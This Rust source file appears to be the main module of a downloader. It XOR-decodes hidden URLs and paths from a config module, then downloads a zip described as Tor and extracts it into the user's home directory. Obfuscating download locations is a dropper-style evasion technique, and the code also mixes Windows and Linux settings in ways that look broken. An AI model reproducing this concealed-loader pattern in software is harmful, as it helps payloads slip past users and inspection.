mod config;
mod xor;
mod setting;

use std::fs::File;
use std::path::PathBuf;
use std::{io, thread, time, error};

fn main() {
    let setting: setting::Setting = load_settings();

    match download_and_extract_tor(&setting) {
        Ok(()) => {},
        Err(error) => panic!("problem to download and extract tor: {:?}", error)
    };
}

fn download_and_extract_tor(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
    let mut attempts = 0;
    let sleep_time = time::Duration::from_millis(5000);

    let mut file: File = tempfile::tempfile()?;

    loop {
        if attempts > 4 {
            return Result::Err(
                String::from("reached maximum download attempts, aborting").into()
            );
        }

        match download(&setting.windows_url, &mut file) {
            Ok(_) => {
                break;
            },
            Err(err) => {
                println!("download failed with {:?}", err);
                attempts += 1;
            }
        }
        
        thread::sleep(sleep_time);
    };

    std::fs::create_dir_all(&setting.linux_path)?;

    let mut zip = zip::ZipArchive::new(file)?;
    zip.extract(&setting.linux_path)?;

    Ok(())
}

fn load_settings() -> setting::Setting {
    let key = String::from(config::ENC_KEY); 

    let windows_url = xor::decode(
        &key, 
        &String::from(config::ENC_WINDOWS_URL)
    ).unwrap_or_else(|_| {
        panic!("problem unserializing windows url");
    });

    let linux_url = xor::decode(
        &key,
        &String::from(config::ENC_LINUX_URL)
    ).unwrap_or_else(|_| {
        panic!("problem unserializing linux url");
    });

    let windows_path = xor::decode(
        &key,
        &String::from(config::ENC_WINDOWS_PATH)
    ).unwrap_or_else(|_| {
        panic!("problem unserializing windows path");
    });

    let linux_path = xor::decode(
        &key,
        &String::from(config::ENC_LINUX_PATH)
    ).unwrap_or_else(|_| {
        panic!("problem unserializing linux path");
    });

    setting::Setting {
        key,
        windows_url,
        linux_url,
        windows_path: expand_user_dir(&windows_path),
        linux_path: expand_user_dir(&linux_path)
    }
}

fn expand_user_dir(path: &String) -> PathBuf {
    let mut home_dir = match dirs::home_dir() {
        Some(d) => d,
        None => panic!("problem finding home user directory")
    };

    home_dir.push(PathBuf::from(path));
    home_dir
}

fn download(url: &String, out_file: &mut File) -> Result<(), ureq::Error> {
    let res = match ureq::get(url).call() {
        Ok(res) => res,
        Err(err) => return Result::Err(err),
    };

    // File buffer to write download data
    let mut writer = io::BufWriter::new(out_file);

    // Download stream reader
    let mut reader = res.into_reader();

    io::copy(&mut reader, &mut writer).unwrap_or_else(|error| {
        panic!("problem writing download to file: {:?}", error);
    });

    Ok(())
}
